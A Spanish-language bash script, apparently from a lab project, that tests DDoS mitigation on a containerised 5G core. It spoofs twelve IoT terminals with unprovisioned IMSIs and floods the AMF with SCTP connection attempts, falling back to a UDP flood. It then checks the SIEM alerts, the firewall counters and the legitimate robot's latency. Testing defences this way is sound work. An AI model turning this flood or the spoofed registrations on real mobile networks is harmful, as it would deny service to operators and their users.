#!/bin/bash
# Prueba DDoS en el plano 5G (PDF seccion 7): terminales IoT falsificados inundan el nucleo con peticiones de
# conexion (NGAP). El sistema de mitigacion (limitador nft del nucleo + rechazo de IMSIs bogus, orquestado por
# el SIEM) bloquea el exceso y preserva el canal de los robots legitimos (sesion y latencia < 10 ms intactas).
# Evidencia en evidence/ddos5g_*.txt
cd ~/netcloud-secure/automation && . venv/bin/activate
EV=~/netcloud-secure/evidence/ddos5g_$(date +%Y%m%d_%H%M%S).txt
cid(){ docker ps --format "{{.Names}}" | grep "\.$1\."; }
C=$(cid core5g); G=$(cid gnb); U=$(cid ue); AMF=10.30.0.10

pgrep -f "siem.py server" >/dev/null || sh ~/netcloud-secure/scripts/siem.sh >/dev/null 2>&1
sleep 2
N0=$(wc -l < ~/netcloud-secure/evidence/siem.log 2>/dev/null || echo 0)

exec > >(tee "$EV") 2>&1
echo "# Prueba DDoS en el plano 5G - $(date '+%Y-%m-%d %H:%M:%S')"
echo "Robot legitimo (uesimtun0) mantiene su sesion; se inunda el AMF (NGAP $AMF:38412) con peticiones bogus."
echo
echo "===== Latencia del robot legitimo ANTES del ataque (20 pings a srv1) ====="
docker exec $U ping -I uesimtun0 -c 20 -i 0.2 -W1 10.50.0.11 | tail -2
echo
echo "===== g5 (nucleo 5G) antes ====="; docker exec $C nft list counters table inet g5 | grep -A1 counter | grep packets

# Robot legitimo: trafico continuo durante el ataque (600 pings * 50 ms = 30 s)
docker exec $U sh -c "rm -f /tmp/leg.out; ping -I uesimtun0 -i 0.05 -c 600 -W1 10.50.0.11 > /tmp/leg.out 2>&1 &"

echo
echo "===== ATAQUE: inundacion de peticiones de conexion (NGAP/SCTP) desde la RAN hacia el AMF ====="
echo "$(date +%T) iniciando flood + 12 UEs IoT falsificados (IMSIs no provisionadas)"
# (a) IMSIs bogus: tormenta de registro/autenticacion en el AMF
for i in $(seq 1 12); do
  B=$(printf "00101000009%04d" $i)
  docker exec $U sh -c "sed 's#^supi:.*#supi: \"imsi-$B\"#' /etc/gsm5g/ue-robot-soldadura.yaml > /tmp/bogus-$i.yaml; nohup nr-ue -c /tmp/bogus-$i.yaml >/dev/null 2>&1 &"
done
# (b) inundacion de INIT SCTP (peticiones de conexion) al AMF durante ~15 s
docker exec -i $G python3 - "$AMF" <<'PY' &
import socket,sys,time
ip=sys.argv[1]; fin=time.time()+15; n=0
while time.time()<fin:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM, 132)  # IPPROTO_SCTP
        s.setblocking(False); s.connect_ex((ip,38412)); s.close(); n+=1
    except OSError:
        # sin SCTP: usar inundacion UDP equivalente hacia el plano de usuario del nucleo
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(200): s.sendto(b"x"*64,(ip,2152))
        n+=200
print(f"  paquetes de ataque enviados: {n}")
PY
FLOOD=$!

echo
echo "===== Deteccion y mitigacion del SIEM ====="
for i in $(seq 30); do tail -n +$((N0+1)) ~/netcloud-secure/evidence/siem.log 2>/dev/null | grep -q "MITIGACION.*NGAP\|ddos" && break; sleep 1; done
tail -n +$((N0+1)) ~/netcloud-secure/evidence/siem.log 2>/dev/null | grep -E "ALERTA DDoS|MITIGACION" || echo "  (sin alerta: revisa el SIEM)"
wait $FLOOD 2>/dev/null

echo
echo "===== g5 (nucleo 5G) despues: NGAP aceptado vs descartado por el limitador ====="
docker exec $C nft list counters table inet g5
echo
echo "===== AMF: identidades bogus rechazadas (muestra) ====="
docker exec $C sh -c "grep -iE 'imsi-0010100000(99|09)|Authentication failure|Reject|failed' /opt/open5gs/var/log/open5gs/amf.log | tail -6"
# matar UEs bogus
docker exec $U sh -c "for i in \$(seq 1 12); do pkill -f bogus-\$i.yaml; done; rm -f /tmp/bogus-*.yaml" 2>/dev/null

echo
echo "===== Robot legitimo DURANTE el ataque (debe conservar sesion y latencia < 10 ms) ====="
for i in $(seq 40); do docker exec $U grep -q transmitted /tmp/leg.out && break; sleep 1; done
docker exec $U tail -2 /tmp/leg.out
echo "Sesion PDU del robot legitimo:"
docker exec $U sh -c "grep -h 'TUN interface' /var/log/ue-robot-soldadura.log | tail -1"
echo
read TX RX < <(docker exec $U grep transmitted /tmp/leg.out | awk '{print $1, $4}')
echo "===== RESULTADO ====="
echo "Robot legitimo: $RX de $TX pings recibidos durante el ataque (perdida = $((TX-RX)))"
echo "El limitador del nucleo (tabla g5) descarto el exceso de NGAP y el AMF rechazo las IMSIs bogus;"
echo "la sesion y la latencia (< 10 ms) del robot legitimo se mantuvieron."
echo
echo "Evidencia: $EV"
